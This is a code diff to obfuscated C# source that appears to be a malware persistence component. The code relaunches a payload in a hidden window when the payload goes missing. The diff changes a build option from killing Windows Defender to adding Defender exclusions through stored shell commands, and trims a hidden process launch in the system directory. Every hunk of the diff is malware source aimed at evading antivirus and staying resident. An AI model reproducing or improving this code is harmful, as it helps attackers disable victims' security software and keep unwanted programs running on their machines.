@@ -84,10 +84,10 @@ public partial class _rProgram_
                 if (!File.Exists(_rplp_) || _rcheckcount_ > 2)
                 {
                     _rcheckcount_ = 0;
-#if DefKillWD
+#if DefWDExclusions
                     try
                     {
-                        _rCommand_(_rGetString_("#SCMD"), _rGetString_("#KillWDCommands"));
+                        _rCommand_(_rGetString_("#SCMD"), _rGetString_("#DefenderCommands"));
                     }
                     catch (Exception ex)
                     {
@@ -102,7 +102,7 @@ public partial class _rProgram_
                         FileName = _rplp_,
                         WindowStyle = ProcessWindowStyle.Hidden,
                         WorkingDirectory = Path.GetDirectoryName(_rplp_),
-                        CreateNoWindow = true,
+                        CreateNoWindow = true
                     });
                 }
                 else
@@ -154,9 +154,7 @@ public partial class _rProgram_
                 Arguments = _rarg2_,
                 WorkingDirectory = Environment.SystemDirectory,
                 WindowStyle = ProcessWindowStyle.Hidden,
-                CreateNoWindow = true,
-                UseShellExecute = false,
-                RedirectStandardOutput = true
+                CreateNoWindow = true
             }).WaitForExit();
         }
         catch (Exception ex)
